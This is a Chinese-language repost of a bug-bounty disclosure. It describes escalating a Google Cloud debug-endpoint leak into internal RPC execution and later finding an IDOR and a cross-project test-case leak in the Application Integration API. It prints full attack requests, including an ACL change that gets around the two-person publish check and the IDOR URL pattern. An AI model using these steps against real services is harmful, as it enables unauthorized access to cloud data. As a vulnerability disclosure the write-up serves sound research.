#  StubZero：在 Google Cloud 生产环境中造成 148,337 美元的远程代码执行损失  
 Ots安全   2026-05-24 08:22  
  
**威胁简报**  
  
  
**恶意软件**  
  
  
**漏洞攻击**  
  
最初只是一个调试端点信息泄露事件，后来演变成在谷歌云生产环境中执行完整的远程代码。三个月后，类似事件再次发生。该漏洞的编号为CVE-2026-2031。  
  
事情的起因是我的一个自动化模糊测试工具向我发出警报，指出 API cloudcrmipfrontend-pa.googleapis.com对一些可疑的端点返回了状态码 200。进一步检查后发现，该 API 似乎有几个公开的调试端点：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0H4bFRiciaK4YCTHsj96CJIUEhDlzXMgF2p2406NNwG2mldA9S6u6nl0bVLHibDwtQQTFJXojU7icKxHc4oicFibmia2BjJ7e8nsTpBmE/640?wx_fmt=png&from=appmsg "")  
  
这是我为测试 Google 内部 API 而构建的内部 API 浏览器工具的屏幕截图，数据来自一份探索文档。  
  
# req2proto 即服务  
  
某些端点似乎GET /v1/integrationPlatform:listServicesByServer总是返回内部服务器错误。然而，该端点似乎会返回google3（谷歌内部源代码单体仓库）中任何 protobuf 消息/v1/integrationPlatform:getProtoDefinition的 proto 定义，即使是像 YouTube 这样不相关的服务也不例外。  
  
Request  
  
```
GET/v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&isEnum=false HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <redacted>Authorization: SAPISIDHASH <redacted>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
```  
  
> 为了通过此 API 进行身份验证，我们使用 Google 专有的第一方身份验证。这需要用到您的 Google 帐户 Cookie 标头，以及使用该Cookie计算出的 Authorization 标头值SAPISID和已列入白名单的来源https://console.cloud.google.com。  
  
  
Response  
  
```
{  "protoDescriptor": {    "name": "InnerTubeContext",    "field": [      {        "name": "client",        "number": 1,        "label": "LABEL_OPTIONAL",        "type": "TYPE_MESSAGE",        "typeName": ".youtube.api.pfiinnertube.YoutubeApiInnertube.ClientInfo",        "jsonName": "client"      },      {        "name": "user",        "number": 3,        "label": "LABEL_OPTIONAL",        "type": "TYPE_MESSAGE",        "typeName": ".youtube.api.pfiinnertube.YoutubeApiInnertube.UserInfo",        "jsonName": "user"      },...
```  
  
  
这影响巨大，因为在谷歌，一切都基于 proto。所有 API 内部都定义为使用 protobuf 的 gRPC 服务，这实际上允许泄露任何端点的请求/响应主体，对于像谷歌这样的黑盒目标来说，这简直就是一座金矿。  
  
过去，我曾为此开发过一个名为req2proto 的工具，但该工具只能查找请求体的 proto 信息，而无法查找响应体信息。此外，它还假定 API 支持 JSPB（application/json+protobuf），而大多数 API 并不支持。因此，我和朋友们开玩笑地将这个接口称为“req2proto as a service”，因为它实际上是该工具的一个托管版本，功能强大得多。  
  
在进一步探测该端点之前，我检查了是否有其他端点泄露信息。  
  
[#内部工作流执行队列泄漏]()  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0Ho3Myb0THRibPZtGXPLKU3CeV8GG6KqDforrqpIASbtsIkyzdYPhrwG4XGZhQegwoYer1NsXwibK5umFkBiapukyIvE5PJzsiazS4/640?wx_fmt=jpeg&from=appmsg "")  
  
最初，在未设置任何查询参数的情况下，此端点仅返回INVALID_ARGUMENT错误。尝试使用类似过滤器*也无效。但是，根据以往经验，这些过滤器参数通常允许按照https://google.aip.dev/160进行任何过滤。  
  
因此，当我尝试client_id>"123"将其用作过滤器时，我得到了一个有趣的反馈：  
  
```
{  "error": {    "code": 500,    "message": "Failed to convert server response to JSON",    "status": "INTERNAL"  }}
```  
  
  
看起来它试图返回的响应没有 JSON 映射。不过，Google API 支持通过标准?alt=参数更改响应内容类型。例如，?alt=proto它会以 protobuf 格式返回输出。  
  
唯一的问题是，由于我们使用 Google 专有的第一方身份验证（Cookie 和 Authorization 标头）进行身份验证，因此我们必须将请求发送到主机名cloudcrmipfrontend-pa.clients6.google.com而不是cloudcrmipfrontend-pa.googleapis.com*.google.com，但 Google 不允许将原始 proto 响应发送到 *.google.com 的请求：  
  
```
Requestunsafeforbrowserclientdomain: cloudcrmipfrontend-pa.clients6.google.com
```  
  
  
幸运的是，这个问题有解决办法。我们可以使用请求头X-Goog-Encode-Response-If-Executable: base64，这样就能以 base64 编码而不是二进制数据的形式获取响应：  
  
```
GET/v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=proto HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <redacted>Authorization: SAPISIDHASH <redacted>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYEX-Goog-Encode-Response-If-Executable: base64
```  
  
  
API 返回了一个大型 base64 protobuf 响应。利用之前泄露的 proto 定义，我成功检索到了该响应的 schema ，并对其进行了正确解码。解码结果显示，这是一个内部工作流执行队列，其中包含将SpannerListQuotaQueueResponse中的数据同步到 Salesforce 的工作流：  
  
```
{  "queue_items": [    {      "queued_request": {        "queued_request_id": "75a885e2-c611-43f7-b4e2-ae0d87bae789",        "client_id": "default",        "workflow_name": "WriteToSfdc",        "priority": "CRITICAL",        "received_timestamp": 1763057385562,        "event_execution_info_id": "615cd9a9-9c0e-46ec-90df-91ee42ec9c37"      },      "event_execution_info": {        "client_id": "default",        "workflow_name": "WriteToSfdc",        "trigger_id": "api_trigger/WriteToSfdc",        ...        "type_url": "type.googleapis.com/enterprise.crm.datalayer.WriteToSfdcRequest",        ...        "sfdc_object": {          "vector_account": {            "id": "001Kf00000wjeK3IAI",            "due_diligence__c": "Pending",            "due_diligence_sub_status__c": "1. PENDING DD - Initial Submission Review"            ...
```  
  
  
此后不久，我提交了这些漏洞的报告。仅仅几个小时后，它就被标记为 P0/S0，并获得了 🎉干得漂亮！  
  
事态会进一步升级吗？  
  
经过一番摸索，我确信这个 API 中可能还有更多值得挖掘的地方，于是我开始研究所有的工作流端点。这个 API 似乎与 Google Cloud 的应用集成有关。  
  
它允许你定义一个“工作流”，你可以为其指定triggerConfig触发工作流的条件以及taskConfig要触发的任务。最令人担忧的是，在查看发现文档时，似乎暗示着有一个名为“任务”的任务，GenericStubbyTypedTask你可以配置工作流来执行该任务，这立刻引起了我的警觉。  
  
```
"EnterpriseCrmEventbusProtoTaskUiModuleConfig": {"description": "Task author would use this type to configure a config module.","id": "EnterpriseCrmEventbusProtoTaskUiModuleConfig","properties": {    "moduleId": {      "description": "ID of the config module.",      "enum": [        ...        "RPC_TYPED",        ...      ],      "enumDescriptions": [        ...        "Configures a GenericStubbyTypedTask.",        ...      ],    }  }},
```  
  
  
摘自谷歌的SRE书籍：  
  
Google 的所有服务都使用名为 Stubby 的远程过程调用 (RPC) 基础架构进行通信；其开源版本 gRPC 也已发布。通常情况下，即使需要调用本地程序中的子例程，也会进行 RPC 调用。这样，如果需要更高的模块化程度，或者服务器代码库不断增长，就可以更轻松地将调用重构到不同的服务器上。  
  
据我理解，Borg（即 Google Production）遵循一种安全模型，其中每个 borgtask 服务都有自己的身份。当您向*.googleapis.com端点发送请求时，前端服务会使用其自身的生产服务身份向后端服务发出 Stubby 调用，同时将您的最终用户上下文信息存储在一个安全票证中。如果该票证包含您的 Gaia 用户 ID，后端服务将以该用户的身份授权该请求。以下是两个从 Google API 错误响应中泄露的安全票证示例：  
  
无需身份验证  
  
```
com.google.apps.framework.auth.IamPermissionDeniedException:  IAM authority does not have the permission 'cloudprivatecatalog.targets.get'  required for action PrivateCatalogV1Beta1-SearchProductson resource ''.Explanation:Security Context:  ValidatedSecurityContextWithSystemAuthorizationPolicy    delegate = ValidatedSecurityContextWithRegistryHandle      delegate = ValidatedSecurityContextWithObligations        delegate = ValidatedIamSecurityContext          user = anonymous          creds = EndUserCreds            loggable_credential {              type: SERVICE_CONTROL_TOKEN            }            access_assertion: ANONYMOUS          peer =            protocol = loas            psp_version = 0            level = strong_privacy_and_integrity            host = jxcbu6.prod.google.com            is_authenticated_host = false            role = cloud-commerce-catalog            user = cloud-boq-clientapi-catalog            is_delegated = true            jobname_chosen_by_user = prod.cloud-commerce-catalog          InternalIAMIdentity            log = originator {              scope: MDB_USER              mdb_user {                user_name: "cloud-boq-clientapi-catalog"              }            }
```  
  
  
第一方身份验证（Gaia）  
  
```
com.google.apps.framework.auth.IamPermissionDeniedException:  IAM authority does not have the permission 'resourcemanager.projects.get'  required for action GetServiceAccessStatuson resource 'projects/613988253758'.Explanation:Security Context:  ValidatedSecurityContextWithCloudPolicyChecks    delegate = ValidatedSecurityContextWithCpeContext      delegate = ValidatedSecurityContextWithObligations        delegate = ValidatedSecurityContextWithRegistryHandle          delegate = ContextWithGaiaMintToken            delegate = ValidatedIamSecurityContext              user = gaiauser/0xaa22527678              creds = EndUserCreds                loggable_credential {                  type: GAIA_MINT                  loggable_gaia_mint { }                }                loggable_credential {                  type: SERVICE_CONTROL_TOKEN                }              peer =                protocol = loas                psp_version = 0                level = strong_privacy_and_integrity                host = pjf8.prod.google.com                is_authenticated_host = false                role = commerceorggovernance-clh                gaiaId = 640201889743                security_realm = campus-dls                is_delegated = false                borgcell = pj                task_id = 2                user_type = MDB_USER_NON_PERSON                jobname_chosen_by_user = prod.commerceorggovernance-clh              InternalIAMIdentity                log = originator {                  scope: GAIA_USER                  gaia_user {                    user_id: 730720269944                  }                }
```  
  
  
在这两种情况下，peer代码块都显示了生产服务身份发起的内部 Stubby 调用。区别在于最终用户上下文：第一个票据是 `<prod service identity>` ANONYMOUS，而第二个票据包含一个GAIA_MINT凭证（在 Google 中使用 cookie 或 bearer 身份验证时，它会被转换为包含嵌入式 GaiaMint 的标准 UberMint 令牌），这意味着后端会以该 Gaia 用户的身份授权请求。这样，对 `<containers name>` 的调用（例如 `<containers name>`）/ContactsService.ListContacts只会返回该已授权用户的联系人。  
  
如果我们能够以集成平台生产服务身份执行任意 Stubby 查询，这将使我们能够访问各种各样的 RPC，从敏感用户数据到代码执行，具体取决于生产用户的权限。因此，谷歌认为这将大幅扩大攻击面，并将其视为远程代码执行 (RCE)。  
  
很多时候，即使你可以在 borglet 中执行代码，除非你特别关心本地处理哪些数据，否则主要影响实际上是通过 Stubby RPC 访问整个生产环境。  
  
但究竟是什么决定了你可以从窃取的 Stubby 原语中调用哪些RpcSecurityPolicyRPC 呢？Google 中的每个 Stubby 服务都定义了一个方法允许列表。以下是 Cloud SQL Speckle Boss 进程中的一个实际示例：  
  
```
mapping {rpc_method: "/SaasActuation.UpdateInstance"rpc_method: "/MaintenancePolicyService.CreateMaintenancePolicy"  ...  authentication_policy {    creds_policy {      rules {        permissions: "auth.creds.useProdUserEUC"        action: ALLOW        in: "mdb:zamm-exe-3-cloud-sql--default-policy"        in: "user:speckle-tool-proxy@prod.google.com"      }      rules {        permissions: "auth.creds.useLOAS"        action: ALLOW        in: "allUsers"      }    }  }authorization_mode: MANUAL_IAMpermission_to_check: "cloudsql.instances.rollout"}
```  
  
  
每个mapping代码块列出了一组 RPC 方法，并声明了哪些调用者可以使用哪些凭证类型来调用这些方法。根据我的理解， `--responses- auth.creds.useLOAStype` 表示“任何 borgtask 都可以使用其自身的 LOAS 身份调用此方法”，而auth.creds.useProdUserEUC`--responses-type` 表示“只有这些特定的 MDB 组才允许将 Gaia 最终用户身份（即 UberMint 令牌）转发到调用中”。  
  
LOAS（低开销身份验证系统）是谷歌的内部身份验证和加密框架，更多信息请参阅此文档。  
  
然后它permission_to_check会告诉后端要对最终解析出的身份强制执行哪个 IAM 权限。  
  
所以即使窃取了 Stubby 原语，你实际上也无法调用所有 RPC。你只能访问那些RpcSecurityPolicy允许你通过对等体身份的 RPC。尽管如此，这仍然极大地扩展了可攻击面。  
  
最初尝试创建工作流时，我遇到了以下INVALID_ARGUMENT错误：  
  
Request  
  
```
POST/v1/integrationPlatform:createDraftWorkflow HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <redacted>Authorization: SAPISIDHASH <redacted>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYEContent-Type: application/jsonContent-Length: 197{"workflow": {    "name": "my-new-workflow-test",    "origin": "UI",    "triggerConfigs": [],    "taskConfigs": []  },"isNewWorkflow": true}
```  
  
  
Response  
  
```
{  "error": {    "code": 400,    "message": "Request contains an invalid argument.",    "status": "INVALID_ARGUMENT"  }}
```  
  
  
有趣的是：如果此请求是从 Google 内部网发送的，它将输出完整的堆栈跟踪，而不是像这样的通用错误。  
  
我怀疑我可能漏掉了一个必需的参数，可能是clientId。想起之前 listQuotaQueue 的响应中存在信息泄露"client_id": "default"，我尝试将其设置为 clientId clientId，结果成功了：  
  
Request：  
```
POST/v1/integrationPlatform:createDraftWorkflow HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <redacted>Authorization: SAPISIDHASH <redacted>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYEContent-Type: application/jsonContent-Length: 197{"workflow": {    "name": "my-new-workflow-test",    "origin": "UI",    "clientId": "default",    "triggerConfigs": [],    "taskConfigs": []  },"isNewWorkflow": true}
```  
  
  
Response：  
```
{  "workflow": {    "workflowId": "53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e",    "name": "my-new-workflow-test",    "origin": "UI",    "creatorEmail": "admin@gvrptest.cry.dev",    "createdTime": "2025-12-01T04:19:14.449503Z",    "lastModifiedTime": "2025-12-01T04:19:14.449503Z",    "status": "DRAFT",    "snapshotNumber": "1",    "tags": [      "HEAD"    ],    "lockedBy": "admin@gvrptest.cry.dev",    "lockedAtTime": "2025-12-01T04:19:14.449503Z",    "lastModifierEmail": "admin@gvrptest.cry.dev",    "clientId": "default"  }}
```  
  
  
然而，似乎要运行一个工作流，必须先发布它，但我就卡在这里了：  
  
Request  
  
```
POST/v1/integrationPlatform:publishWorkflow HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <redacted>Authorization: SAPISIDHASH <redacted>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYEContent-Type: application/json{  "workflowId": "53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e"}
```  
  
  
Response  
  
```
{  "error": {    "code": 403,    "message": "Publisher admin@gvrptest.cry.dev cannot be the same as the last editor admin@gvrptest.cry.dev of the integration my-new-workflow-test with snapshot number 1 and integration ID 53b2a49c-dd5e-4e45-829b-61a3b2e8ff6e being edited from the UI. Please raise a Request to Publish and have your change approved by another person.",    "status": "PERMISSION_DENIED"  }}
```  
  
  
我需要想办法在工作流程中添加另一个用户，并使用该用户进行发布。当时，我尝试使用 ACL 端点添加另一个帐户，但权限设置未能正确生效。  
  
[#改变一切的私信]()  
  
  
在我最初报告该漏洞一个多月后，我在一个与其他几位研究人员的 Discord 群聊中开玩笑地提到，我发现了一个漏洞，会导致 Google 内部的 protobuf 定义泄露：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0GhUvUmRrnYvzmDQ1Fk99IVAqeTDroF0VJxhGWPAYRJmelRcb9ZiaR6aPTDbfvkpBz1WXLLMouT26pv4RQme5DwFiak9YLBXO90o/640?wx_fmt=jpeg&from=appmsg "")  
  
  
这时，shrugged提到他也有同样的毛病，我们的谈话就此展开。  
  
原来，shrugged 在研究另一个漏洞时，也注意到了应用程序集成JavaScript 文件中列出的这些端点，当时他也在调查这个 API 。他发现这些端点GenericStubbyTypedTask可能是一个远程代码执行 (RCE) 漏洞，但由于没有有效的client_id初始工作流草稿，所以束手无策。  
  
与此同时，我遇到了client_id配额队列泄漏的问题，但在发布步骤卡住了。我们迅速交换了信息：我分享了client_id: "default"我遇到的困难以及遇到的问题，然后我们从那里继续讨论。  
  
谷歌已经针对我最初的报告推出了修复程序，因此许多原始端点现在都返回 PERMISSION_DENIED 错误。然而，我们注意到了一些有趣的事情——许多端点在不同的服务名称下都有完全相同的可用版本：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0FoiaIOotpVtVeM2QzvnicMDFiaZkmvXwg0E9b2JScfmU4qkmO8tfBcqa6snJQJdGBRRPxkx5AhwzL8x63DNy7BfYMRCMEaxNEf04/640?wx_fmt=png&from=appmsg "")  
  
最初的修复只阻止了原有的“WorkflowEditorService”端点，但没有阻止这些对应的端点。问题在于createDraftWorkflow——我们找不到对应的端点，它返回了 PERMISSION_DENIED 错误：  
  
  
```
{  "error": {    "code": 403,    "message": "The caller does not have permission",    "status": "PERMISSION_DENIED"  }}
```  
  
  
奇怪的是，shrugged 尝试同样的请求时，第一次就成功了，而我一直都失败了PERMISSION_DENIED。这时我才恍然大悟：修复程序还没有完全传播到所有负载均衡的后端。通过反复发送相同的请求，我们可以可靠地将请求路由到仍然允许其通过的后端：  
  
  
```
HTTP/2 200 OKContent-Type: application/json; charset=UTF-8{ "workflow": { "workflowId": "c6141c63-ac7a-4350-b582-7615ef045d0c", "name": "retest", "origin": "UI", "creatorEmail": "admin@gvrptest.cry.dev", "createdTime": "...", "lastModifiedTime": "...", "status": "DRAFT", "snapshotNumber": "1", "tags": [ "HEAD" ], "lockedBy": "admin@gvrptest.cry.dev", "lockedAtTime": "...", "lastModifierEmail": "admin@gvrptest.cry.dev", "clientId": "default" } }
```  
  
  
然而，任务名称 GenericStubbyTypedTask 似乎并不存在。查看响应/v1/integrationPlatform:listTaskEntities（使用 getProtoDefinition 提供的 proto 定义解码），它似乎只提供了具有以下类型的任务：IO_TEMPLATE  
  
```
{  "taskEntities": [    {      "metadata": {        "name": "Delete SFDC Record",        "descriptiveName": "Delete Salesforce Record",        "description": "Deletes a record in Salesforce",        "g3DocLink": "https://g3doc.corp.google.com/company/teams/cloudcrm/platform/user_guide/tasks/write_to_sfdc.md#delete-sfdc-record-task",        "iconLink": "https://gstatic.com/enterprise/crm/eventbus/images/icons/blue/salesforce_009EDB_48px_1_blue.svg",        "codeSearchLink": "https://cs.corp.google.com/piper///depot/google3/java/com/google/enterprise/crm/eventbus/connectors/generic/impl/GenericRestV2TaskImpl.java",      ...      },      "paramSpecs": {        "parameters": [          {            "key": "salesforceDomain",            "dataType": "STRING_VALUE",            "className": "java.lang.String",            "config": {              "descriptivePhrase": "Check in Salesforce: Setup > Company Settings > My Domain. If you don't have My Domain enabled, please use \"yourinstance.salesforce.com\" as the Salesforce domain.",              "label": "Salesforce domain",              "uiPlaceholderText": "e.g. yourDomain.my.salesforce.com"            },            "required": 1          },        ...        ]      },      ...      "taskType": "IO_TEMPLATE"    },    ...  ]}
```  
  
  
GenericStubbyTypedTask 似乎是底层的一部分ASIS_TEMPLATE：  
  
```
{  "taskType": {      "description": "Defines the type of the task",      "enum": [        "TASK",        "ASIS_TEMPLATE",        "IO_TEMPLATE"      ],      "enumDescriptions": [        "Normal IP task",        "Task is of As-Is Template type",        "Task is of I/O template type with a different underlying task"      ],      "type": "string"  }}
```  
  
  
有趣的是，此端点的底层 RPC 是。这与公共应用程序集成产品的 RPCgoogle.internal.cloud.crm.ipfrontend.v1.WorkflowEditorService/ListTaskEntities非常相似，尽管后者也没有直接返回任何任务。/$rpc/google.cloud.integrations.v1alpha.Integrations/ListTaskEntitiesASIS_TEMPLATE  
  
回顾云控制台中应用程序集成的JS 代码：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0Hck6lgYvpFJnheNcuTZhSVvYrBJI5Jb97GzuibHDibrMkLYjFoLjCNoUePU4BqqG3oUnwnH4tVqZzH4SP9egkDNj04zr50RpbJI/640?wx_fmt=jpeg&from=appmsg "")  
  
  
```
["Vertex AI - Predict","https://www.gstatic.com/enterprise/crm/eventbus/images/icons/custom_tasks/document_ai.png"],["GenericStubbyTypedTaskV2","http://gstatic.com/enterprise/crm/eventbus/images/icons/blue/stubby_48px_blue.svg"],["RunGoogleSqlPlxQueryTask","https://fonts.gstatic.com/s/i/productlogos/plx/v6/192px.svg"],["ConvertDremelResultToJsonTask","https://www.gstatic.com/images/icons/material/system/2x/settings_googblue_24dp.png"],
```  
  
  
  
任务的确切名称是GenericStubbyTypedTaskV2，甚至还有自己的图标：  
  
尝试GenericStubbyTypedTask在应用程序集成上进行配置时返回错误，并显示了所需的字段：  
  
```
{  "error": {    "code": 400,    "message": "'Required input key serverSpec not present in task GenericStubbyTypedTaskImpl, task number 1.'",    "status": "INVALID_ARGUMENT"  }}
```  
  
  
重复上述步骤，每次查找缺失的键，都会发现serverSpec、serviceName和serviceMethod。这些参数同样适用于GenericStubbyTypedTaskV2。参考Ezequiel Pereira的protobuf 仓库以及我们在另一个发现文档中泄露的 GSLB 地址，我们将任务配置为调用/ServerStatus.GetServicesgslb :alkali-base：  
  
有趣的是：Alkali 是谷歌的内部框架，谷歌员工可以使用它来快速搭建生产 API，最大限度地减少样板代码，但它往往存在很多安全问题。  
  
```
HTTP/2 200 OKContent-Type: application/json; charset=UTF-8{"workflow": {"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19", "name": "retest-test123", "taskConfigs": [{"taskName": "GenericStubbyTypedTaskV2", "taskNumber": "1", "parameters": {"response": {"key": "response", "value": {"stringValue": "$response$"}, "dataType": "STRING_VALUE"}, "serverSpec": {"key": "serverSpec", "value": {"stringValue": "gslb:alkali-base"}, "dataType": "STRING_VALUE"}, "serviceName": {"key": "serviceName", "value": {"stringValue": "ServerStatus"}, "dataType": "STRING_VALUE"}, "serviceMethod": {"key": "serviceMethod", "value": {"stringValue": "GetServices"}, "dataType": "STRING_VALUE"}}, "position": {"x": -716, "y": -445}, "label": "Stubby Internal", "incomingEdgeCount": 1, "taskType": "ASIS_TEMPLATE", "externalTaskType": "NORMAL_TASK"}], "triggerConfigs": [{"startTasks": [{"taskNumber": "1"}], "properties": {"Trigger name": "my-api-trigger-123"}, "triggerType": "API", "triggerNumber": "1", "enabledClients": ["default"], "triggerId": "api_trigger/my-api-trigger-123"}], "origin": "UI", "creatorEmail": "<REDACTED>", "createdTime": "2026-01-12T09:45:55.896951Z", "lastModifiedTime": "2026-01-12T09:45:55.896951Z", "status": "DRAFT", "snapshotNumber": "1", "tags": ["HEAD"], "lockedBy": "<REDACTED>", "lockedAtTime": "2026-01-12T09:45:55.896951Z", "lastModifierEmail": "<REDACTED>", "clientId": "default"}}
```  
  
  
这里的一切都与应用程序集成惊人地相似——工作流结构、任务配置，甚至发布和运行流程。注意到"position": {"x": -716, "y": -445}我们工作流中的坐标了吗？内部用户界面可能与应用程序集成的可视化工作流编辑器非常相似，我们实际上是在设置任务位置的坐标：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/zNsFJyIuL0HHufNeDYSFichzTQksUHFaWJ7F60glf5icZ9y8JZxOgnaUB18MlIVwx58WC9GBytJW5Fg1R2D5tX61oaZCH9CbvBSvy2AkyNicYE/640?wx_fmt=jpeg&from=appmsg "")  
  
还记得之前阻止我发布内容的 ACL 问题吗？耸耸肩，我想到可以通过更新 ACL 来绕过它，更新内容时IP_EVENTBUS_WORKFLOWS使用攻击者控制的两个 Google 帐户的混淆 Gaia ID。  
  
Request  
  
```
POST/v1/integrationPlatform/auth:setAcl HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.comCookie: <redacted>Authorization: <redacted>Origin: https://console.cloud.google.comX-Goog-Api-Key: AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYEContent-Type: application/jsonContent-Length: 500{"resourceInfo": {"resource": "IP_EVENTBUS_WORKFLOWS", "id": "retest-test123"}, "acl": {"entries": [{"scope": {"obfuscatedGaiaId": "100029910836469267942"}, "role": 105}, {"scope": {"obfuscatedGaiaId": "113728935872649341310"}, "role": 105}]}}
```  
  
  
Response  
  
```
HTTP/2 200 OKContent-Type: application/json; charset=UTF-8{}
```  
  
  
首先，我们使用第一个攻击者的 Google 帐户切换了发布工作流的请求：  
  
```
POST /v1/integrationPlatform/workflowdeployment:toggleRequestToPublishWorkflow HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.com...{"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19"}
```  
  
  
最后，使用第二个攻击者帐户发布工作流程：  
  
```
POST /v1/integrationPlatform/workflowdeployment:publishWorkflow HTTP/2Host: cloudcrmipfrontend-pa.clients6.google.com...{"workflowId": "f91833bf-eacb-43ac-8490-099fef977e19"}
```  
  
  
运行配置了工作流，GenericStubbyTypedTaskV2并将服务/方法设置为serverSpec，我们能够执行 Stubby 查询：gslb:alkali-base/ServerStatus.GetServices  
  
```
...{    "protoValue": {    "@type": "type.googleapis.com/rpc.ServiceList",    "service": [        {        "name": "AlkaliBaseAccountService",        "descriptor": {            "filename": "google/internal/alkali/base/v1/alkali_base_account_service.proto",            "name": "AlkaliBaseAccountService",            "method": [            {                "name": "ListAccounts",                "argumentType": "google.internal.alkali.base.v1.ListAccountsRequest",                "resultType": "google.internal.alkali.base.v1.ListAccountsResponse",                "deadline": 30,                "securityLevel": "none"            },            {                "name": "ListAccessibleAccounts",                "argumentType": "google.internal.alkali.base.v1.ListAccessibleAccountsRequest",                "resultType": "google.internal.alkali.base.v1.ListAccountsResponse",                "deadline": 30,                "securityLevel": "none"            },            ...
```  
  
  
随后，我们更新了最初的漏洞报告，使其具备了远程代码执行（RCE）能力。我们两人都无法独自完成这项工作，而且时机非常关键：在我们完成概念验证（PoC）后仅仅一个小时，修复程序就createDraftWorkflow完全生效了。如果再晚一点，这个远程代码执行能力就只能停留在理论层面了。话虽如此，在我们真正能够在谷歌服务器上执行代码之前，谷歌就阻止了我们的行动。  
  
[#时间线]()  
  
（第一次 RCE）  
  
2025年12月1日 - 向谷歌发送初步报告  
  
2025-12-01 - Google 将报告分类为 P0/S0  
  
2025-12-01 - 🎉漂亮！  
  
2026年1月12日 - 已将远程代码执行升级情况告知谷歌安全团队  
  
2026-01-12 - 更新报告，包含远程代码执行概念验证 (RCE PoC)。  
  
2026年1月12日 - 谷歌升级了此报告  
  
2026年1月16日 -专家组裁定奖励6万美元。裁决理由：这份报告质量卓越！漏洞类别为“Google Cloud 生产环境遭到入侵”。攻击者与受害者之间没有任何交互或关联。涉及默认的 Google Cloud 产品。  
  
第二轮（3个月后）  
  
你以为事情就此结束了？没那么简单。三个月后，我的模糊测试工具提示我公共应用程序集成产品的公共 API中存在一些 IDOR（不可识别错误） 。  
  
事实证明，在整个 API 中，你可以在 URL 中引用自己的项目 ID，但引用其他人的 UUID：  
  
```
GET/v1/projects/<your-project>/locations/us-central1/integrations/anythinghere/versions/<victim-uuid> HTTP/2Host: integrations.googleapis.comAuthorization: Bearer <redacted>
```  
  
  
API 会很乐意地返回受害者的资源，因为身份验证检查是根据您的项目 ID 进行的（您有权访问自己的项目），但是没有进行访问控制检查，以确定该 ID 是否真的与您的项目关联。  
  
然而，仅凭这一点影响不大，因为这些是 UUIDv4。搜索空间太大，无法通过暴力破解有效获取（搜索空间为 10^36）。因此，我开始寻找任何可能泄露受害者资源 UUID 的方法。  
  
那时我注意到了这个有趣的“测试用例”功能。文档中是这样描述的：  
  
借助应用集成，您可以针对连接和管理 Google Cloud 服务及其他业务应用的复杂集成创建并运行多个测试用例。通过测试集成流程，您可以确保集成按预期运行。  
  
有趣的是，当你查看前端加载测试用例的方式时，你会发现浏览器会发送如下请求：  
  
```
POST/$rpc/google.cloud.integrations.v1alpha.TestCases/ListTestCases HTTP/2Host: us-central1-integrations.clients6.google.comContent-Type: application/x-protobuf< RAW PROTOBUF DATA >
```  
  
  
实际的请求负载是 protobuf 格式的，我已经在这里解码，以便您可以看到它的样子：  
  
```
{  "1": "projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4",  "2": "workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4",  "6": {    "1": ["name", "display_name", "update_time", "client_id"]  }}
```  
  
  
字段1是父资源（我的项目，我的版本 UUID），字段6是响应字段掩码，字段2似乎workflow_id = 631a0566-02fc-4dce-b319-25e2c68168f4是某种过滤器。如果省略此字段，是否会返回所有工作流的测试用例？肯定不会……  
  
2从6请求中删除字段：  
  
```
{  "1": "projects/eastern-camp-489414-j3/locations/us-central1/integrations/RestTaskTest/versions/631a0566-02fc-4dce-b319-25e2c68168f4"}
```  
  
  
...收到的回复包含了来自其他所有 GCP 项目的测试用例：  
  
  
```
{  "testCases": [    {      "name": "projects/331540621401/locations/us-central1/integrations/my-draft-integration/versions/631a0566-02fc-4dce-b319-25e2c68168f4/testCases/b25fb963-792c-419d-a98b-eb930b2a29e3",      "displayName": "test",      "triggerId": "api_trigger/AI_bebbia_CreateWOSubs_API_1",      "testInputParameters": [        {          "key": "InputData",          "dataType": "JSON_VALUE",          "defaultValue": {            "jsonValue": "{\n \"OldSKU\": \"300465\",\n \"orderid\": \"7fe9ffa9-d122-484b-96df-9ef85cd3aa8a\",\n ...\n}"          },          "displayName": "InputData"        }      ],      "creatorEmail": "redacted@google.com",      ...    }  ]}
```  
  
  
仔细观察响应，您可能会发现一些异常。versions/...每个结果中的段都是 ` <version> 631a0566-02fc-4dce-b319-25e2c68168f4`。这是我的版本 UUID，也就是我在 `<field>` 字段中发送的那个1。API 直接将它反映到每个测试用例的 `<testcase>` 中name，即使这些测试用例属于不同项目中完全不同的集成。  
  
因此，虽然我现在拥有了每个 GCP 项目中的每个测试用例 ID，以及它们的集成名称和创建者电子邮件，但我之前需要输入到 IDOR 中的实际受害者版本 UUID 却在响应中无处可寻。  
  
